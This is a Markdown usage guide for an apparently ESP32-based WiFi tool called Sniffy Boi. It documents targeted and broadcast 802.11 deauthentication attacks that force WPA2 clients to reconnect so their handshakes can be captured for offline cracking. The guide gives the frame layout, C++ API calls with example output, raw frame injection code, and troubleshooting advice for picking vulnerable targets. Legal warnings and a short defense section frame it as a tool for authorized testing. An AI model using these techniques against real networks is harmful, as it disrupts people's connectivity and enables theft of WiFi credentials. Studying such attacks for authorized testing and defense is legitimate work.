# Sniffy Boi - Deauth Attack Guide

## ⚠️ CRITICAL LEGAL WARNING

**THIS TOOL IS FOR AUTHORIZED USE ONLY**

### Legal Requirements
Before using deauth attacks, you **MUST** have:
- ✅ **Written authorization** to test the target network
- ✅ **Explicit permission** from the network owner
- ✅ **Documented scope** of testing (specific SSIDs/BSSIDs)
- ✅ **Legal compliance** with local laws and regulations

### Prohibited Uses
❌ **NEVER** use deauth attacks for:
- Disrupting neighbors' WiFi
- Attacking public networks (coffee shops, airports, etc.)
- Mass disconnection campaigns
- Denial of service attacks
- Any unauthorized network testing

### Criminal Penalties
Unauthorized deauth attacks violate:
- **Computer Fraud and Abuse Act (CFAA)** - up to 10 years prison
- **Wiretap Act** - criminal penalties + civil liability
- **State computer crime laws** - varies by jurisdiction
- **FCC regulations** - fines up to $10,000 per violation

**Use responsibly. You are solely responsible for legal compliance.**

---

## 🎯 What is a Deauth Attack?

A **deauthentication attack** sends spoofed 802.11 management frames that appear to come from the access point, instructing clients to disconnect. When clients attempt to reconnect, they perform the WPA 4-way handshake, which Sniffy Boi captures for offline cracking.

### How It Works
```
1. Target identified (AP + Client)
   ↓
2. Sniffy sends deauth frame: "AP → Client: Disconnect"
   ↓
3. Client receives deauth, disconnects from AP
   ↓
4. Client automatically attempts to reconnect
   ↓
5. Client + AP perform 4-way handshake (M1-M4)
   ↓
6. Sniffy captures handshake for offline cracking
```

### Frame Structure
```
802.11 Deauthentication Frame (26 bytes)
┌─────────────────────────────────────────────────┐
│ Frame Control    (2 bytes)  │ 0xC0 0x00        │
│ Duration         (2 bytes)  │ 0x00 0x00        │
│ Destination MAC  (6 bytes)  │ Client address   │
│ Source MAC       (6 bytes)  │ AP address       │
│ BSSID            (6 bytes)  │ AP address       │
│ Sequence Control (2 bytes)  │ 0x00 0x00        │
│ Reason Code      (2 bytes)  │ 0x01 0x00        │
└─────────────────────────────────────────────────┘

Reason codes:
  1 = Unspecified
  2 = Previous authentication no longer valid
  3 = Deauthenticated (leaving network)
  4 = Disassociated due to inactivity
```

---

## 🔧 Implementation

### API Functions

#### 1. Targeted Deauth (Specific Client)
```cpp
void sendDeauthAttack(const uint8_t* target_mac, const uint8_t* ap_mac, uint8_t reason);
```

**Parameters:**
- `target_mac`: Client MAC address to disconnect
- `ap_mac`: Access point BSSID
- `reason`: Deauth reason code (default: 1 = Unspecified)

**Behavior:**
- Sends **bidirectional** deauth:
  - AP → Client ("You are disconnected")
  - Client → AP ("I am leaving")
- Rate limited to 100ms minimum between attacks
- Increments deauth counter

**Example:**
```cpp
uint8_t client[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
uint8_t ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
sniffer->sendDeauthAttack(client, ap);
```

---

#### 2. Broadcast Deauth (All Clients)
```cpp
void sendDeauthBroadcast(const uint8_t* ap_mac, uint8_t reason);
```

**Parameters:**
- `ap_mac`: Access point BSSID
- `reason`: Deauth reason code

**Behavior:**
- Sends deauth to **broadcast MAC** (FF:FF:FF:FF:FF:FF)
- Disconnects **ALL** clients on the AP
- Sends **5 packets in burst** for reliability
- Shows warning banner before execution

**Use with extreme caution** - this is a denial of service attack!

**Example:**
```cpp
uint8_t ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
sniffer->sendDeauthBroadcast(ap);  // Disconnects ALL clients
```

---

#### 3. Trigger Handshake (Automated)
```cpp
void triggerHandshake(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t burst_count);
```

**Parameters:**
- `ap_mac`: Access point BSSID
- `client_mac`: Client MAC address
- `burst_count`: Number of deauth packets to send (default: 5)

**Behavior:**
- Sends deauth burst to force reconnection
- Monitors for EAPOL handshake capture
- Checks if handshake already captured
- Provides status updates to serial

**This is the recommended function for handshake capture.**

**Example:**
```cpp
uint8_t ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
uint8_t client[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
sniffer->triggerHandshake(ap, client, 5);  // Send 5 deauths, monitor for handshake
```

---

## 🎮 Usage Examples

### Example 1: Capture Handshake for Known Network

```cpp
// Scenario: You have authorization to test "MyHomeWiFi"
// You've identified: AP = AA:BB:CC:DD:EE:FF, Client = 11:22:33:44:55:66

uint8_t ap_mac[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
uint8_t client_mac[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};

// Trigger handshake capture
sniffer->triggerHandshake(ap_mac, client_mac, 5);

// Output:
// ╔════════════════════════════════════════════════════════════╗
// ║          TRIGGERING HANDSHAKE CAPTURE                      ║
// ╚════════════════════════════════════════════════════════════╝
//   AP:     AA:BB:CC:DD:EE:FF
//   Client: 11:22:33:44:55:66
//   Burst:  5 deauth packets
// ════════════════════════════════════════════════════════════
//
// [DEAUTH] Sent to 11:22:33:44:55:66 from AP AA:BB:CC:DD:EE:FF (reason=1)
// [DEAUTH] Sent from 11:22:33:44:55:66 to AP (bidirectional)
// ... (5 deauths sent) ...
//
// ✓ Deauth burst complete!
// → Monitoring for handshake (reconnection should happen within 5-10s)
// → Watch for [EAPOL] messages...

// Wait ~5-10 seconds for handshake...

// [EAPOL] 11:22:33:44:55:66 <-> AA:BB:CC:DD:EE:FF [M1] [NEW HANDSHAKE: MyHomeWiFi] [ANonce extracted]
// [EAPOL] AA:BB:CC:DD:EE:FF <-> 11:22:33:44:55:66 [M2] [SNonce + MIC extracted]
//
// ╔════════════════════════════════════════════════════════════╗
// ║          ★★★ COMPLETE HANDSHAKE CAPTURED! ★★★            ║
// ╚════════════════════════════════════════════════════════════╝
//   SSID: MyHomeWiFi
//   AP:   AA:BB:CC:DD:EE:FF
//   Client: 11:22:33:44:55:66
//   Messages: M1=Y M2=Y M3=N M4=N
//   Key Version: 2 (AES-CCMP)
```

---

### Example 2: Manual Deauth (Advanced)

```cpp
// Send single deauth to specific client
uint8_t ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
uint8_t client[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};

sniffer->sendDeauthAttack(client, ap, DEAUTH_REASON_UNSPECIFIED);

// Output:
// [DEAUTH] Sent to 11:22:33:44:55:66 from AP AA:BB:CC:DD:EE:FF (reason=1)
// [DEAUTH] Sent from 11:22:33:44:55:66 to AP (bidirectional)
```

---

### Example 3: Stress Test (Authorized Network Only)

```cpp
// Scenario: Testing WiFi resilience on YOUR network

uint8_t ap[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};

// Disconnect all clients (for resilience testing)
sniffer->sendDeauthBroadcast(ap);

// Output:
// ╔════════════════════════════════════════════════════════════╗
// ║  ⚠️  WARNING: BROADCAST DEAUTH ATTACK                     ║
// ║  This will disconnect ALL clients from the AP             ║
// ║  AUTHORIZED USE ONLY - Ensure you have permission!        ║
// ╚════════════════════════════════════════════════════════════╝
//
// [DEAUTH] Broadcast packet 1/5 sent from AP AA:BB:CC:DD:EE:FF
// [DEAUTH] Broadcast packet 2/5 sent from AP AA:BB:CC:DD:EE:FF
// ...
```

---

## 🛡️ Built-in Safeguards

### 1. Rate Limiting
```cpp
static const uint32_t DEAUTH_RATE_LIMIT_MS = 100;  // Minimum 100ms between attacks
```

Prevents:
- Accidental DoS from rapid-fire attacks
- Excessive channel congestion
- Firmware crashes from buffer overflow

**If you hit rate limit:**
```
[DEAUTH] Rate limited - wait 100ms between attacks
```

---

### 2. Bidirectional Deauth
Why send both AP→Client and Client→AP?

- **Effectiveness**: Some clients only respect deauth from specific direction
- **802.11w Protected Management Frames**: Bidirectional increases success rate
- **Reliability**: Ensures disconnection even if one direction is filtered

---

### 3. Warning Banners
Broadcast deauth shows explicit warning:
```
╔════════════════════════════════════════════════════════════╗
║  ⚠️  WARNING: BROADCAST DEAUTH ATTACK                     ║
║  This will disconnect ALL clients from the AP             ║
║  AUTHORIZED USE ONLY - Ensure you have permission!        ║
╚════════════════════════════════════════════════════════════╝
```

Prevents accidental misuse.

---

## 🎯 Best Practices

### 1. Target Identification
Before deauth attack:
```cpp
// 1. Scan for targets
sniffer->begin(6);  // Start on channel 6

// 2. Wait for beacon/probe traffic to identify AP + clients
delay(10000);  // Scan for 10 seconds

// 3. Get device list
auto& devices = sniffer->getDevices();
for (auto& device : devices) {
    Serial.printf("MAC: %s | SSID: %s | Type: %s\n",
                  device.second.mac_str.c_str(),
                  device.second.ssid.c_str(),
                  device.second.is_ap ? "AP" : "Client");
}

// 4. Select target AP and client
```

---

### 2. Timing
**Best time to trigger handshake:**
- When client is actively connected (RSSI > -70 dBm)
- Not during heavy data transfer (may miss EAPOL frames)
- Lock to target channel (disable hopping during capture)

**After deauth:**
- Wait 5-10 seconds for reconnection
- Some clients may take up to 30 seconds
- iOS devices often faster (3-5s), Android variable (5-15s)

---

### 3. Channel Management
```cpp
// Lock to target channel during handshake capture
sniffer->setChannel(6);  // AP is on channel 6

// Send deauth
sniffer->triggerHandshake(ap_mac, client_mac, 5);

// DO NOT channel hop for at least 10 seconds!
// Handshake will be missed if you hop away during capture
```

---

### 4. Success Indicators
**Deauth successful:**
```
[DEAUTH] Sent to ... (reason=1)
[DEAUTH] Sent from ... (bidirectional)
```

**Handshake captured:**
```
╔════════════════════════════════════════════════════════════╗
║          ★★★ COMPLETE HANDSHAKE CAPTURED! ★★★            ║
╚════════════════════════════════════════════════════════════╝
```

**Handshake failed:**
- No EAPOL messages after 30 seconds
- Possible causes: Client disabled, WPA3 (not supported), 802.11w enabled

---

## 🔍 Troubleshooting

### Deauth Not Working

**Symptom:** Client does not disconnect
**Causes:**
1. **802.11w (PMF)** enabled - Protected Management Frames encrypt deauth
   - Solution: Target older networks without PMF
2. **Wrong channel** - Deauth sent on wrong channel
   - Solution: Lock to target channel before attack
3. **Client out of range** - RSSI too weak
   - Solution: Target clients with RSSI > -70 dBm
4. **ESP32 TX power too low**
   - Solution: Increase TX power (not yet implemented)

---

### Handshake Not Captured

**Symptom:** Deauth works, but no EAPOL frames
**Causes:**
1. **Channel hopping during capture** - Missed handshake on different channel
   - Solution: Stay locked to channel for 10+ seconds
2. **WPA3-only network** - Uses different handshake (SAE)
   - Solution: Target WPA2 networks
3. **Client didn't reconnect** - Some clients delay reconnection
   - Solution: Wait longer, or send additional deauth

4. **Monitoring on wrong interface** - Sniffy on different channel
   - Solution: Verify sniffer channel matches AP channel

---

### Rate Limited

**Symptom:**
```
[DEAUTH] Rate limited - wait 100ms between attacks
```

**Solution:**
- Wait 100ms between `sendDeauthAttack()` calls
- Use `triggerHandshake()` instead (handles timing automatically)
- Rate limit is intentional - prevents DoS

---

## 📊 Technical Details

### Why Deauth Works
802.11 management frames (beacon, probe, deauth) are:
- **Unencrypted** (except with 802.11w PMF)
- **Unauthenticated** (no signature verification)
- **Spoofable** (can forge source MAC address)

ESP32's `esp_wifi_80211_tx()` sends raw 802.11 frames, bypassing normal WiFi stack.

### Frame Injection
```cpp
esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, 26, false);
```

**Parameters:**
- `WIFI_IF_STA`: Use station interface
- `deauth_frame`: 26-byte deauth packet
- `26`: Frame length
- `false`: Do not encrypt (management frames are unencrypted)

---

## 🎓 Educational Context

### Legitimate Use Cases

1. **Penetration Testing**
   - Assess WiFi security posture
   - Test client reconnection behavior
   - Validate WPA2 password strength

2. **Network Administration**
   - Force clients to reconnect (troubleshooting)
   - Test access point failover
   - Validate 802.11w implementation

3. **CTF Competitions**
   - Capture-the-Flag wireless challenges
   - Security competition scenarios

4. **Security Research**
   - Study WiFi protocol vulnerabilities
   - Develop defensive countermeasures

---

### Defense Against Deauth Attacks

**As a network admin:**
1. **Enable 802.11w (PMF)** - Protected Management Frames
   - WPA3 requires PMF
   - WPA2 can optionally enable PMF
   - Encrypts deauth/disassoc frames

2. **Use WPA3** - SAE handshake replaces 4-way handshake
   - Not vulnerable to deauth-based handshake capture
   - Forward secrecy protection

3. **Wireless Intrusion Detection (WIDS)**
   - Detect deauth storms (many deauths in short time)
   - Alert on spoofed management frames

4. **Client-side defenses**
   - Some modern clients ignore rapid deauths
   - Delayed reconnection after deauth

---

## 🚀 Next Steps

After capturing handshakes, you can:

1. **Export for hashcat** - See `HANDSHAKE_CAPTURE_GUIDE.md`
2. **Save to SD card** - Coming soon
3. **Generate Wigle.net export** - With GPS coordinates
4. **Build password dictionary** - Based on SSID patterns

---

## 📝 Summary

**Sniffy Boi's deauth attack features:**
- ✅ Targeted deauth (specific client)
- ✅ Broadcast deauth (all clients)
- ✅ Automated handshake triggering
- ✅ Rate limiting (100ms minimum)
- ✅ Bidirectional deauth (AP→Client + Client→AP)
- ✅ Warning banners for broadcast attacks
- ✅ Handshake completion detection
- ✅ Minimal overhead (< 100 bytes flash)

**Use responsibly and ethically. Authorization required.**

---

**Happy (authorized) hacking!** 🎯
